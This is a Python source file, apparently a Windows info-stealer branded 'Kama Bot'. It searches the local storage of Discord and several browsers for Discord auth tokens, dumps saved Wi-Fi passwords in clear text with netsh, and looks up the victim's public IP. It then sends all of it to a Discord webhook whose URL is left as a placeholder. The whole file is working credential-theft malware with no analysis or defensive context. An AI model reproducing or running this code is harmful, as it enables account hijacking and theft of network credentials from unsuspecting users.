from discord_webhook import DiscordWebhook, DiscordEmbed
from urllib.request import Request, urlopen
import os
import re


def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

#-----------------TOKEN-------------------------
def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'

    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()

    profiles_output = os.popen("netsh wlan show profile").read()
    passwords = []
    for line in profiles_output.splitlines():
        if "Perfil de todos los usuarios" in line:
            profile_name = line.split(":")[1].strip()
            profile_output = os.popen(f"netsh wlan show profile name=\"{profile_name}\" key=clear").read()
            password_lines = [line.strip() for line in profile_output.splitlines() if "Contenido de la clave" in line]
            if password_lines:
                password_line = password_lines[0]
                # Add the profile name and password to the list
                passwords.append(f"{profile_name}: {password_line.split(':')[1].strip()}")
            else:
                passwords.append(f"{profile_name}: Password not found")
    passwords_str = '\n'.join(passwords)


    webhook = DiscordWebhook(url='WEBHOOK_HERE')
    embed = DiscordEmbed(title='Kama Bot', description='', color='000000')
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1024961334359633920/1100033827755261952/webhook.png")
    embed.add_embed_field(name=":computer: Ip", value=f"```{ip}```")
    embed.add_embed_field(name=":satellite: Wifi Passwords", value=f"```{passwords_str}```", inline=False)
    embed.add_embed_field(name=":identification_card: Tokens", value=f"```{tokens}```", inline=False)
    webhook.add_embed(embed)
    response = webhook.execute()

if __name__ == '__main__':
    main()
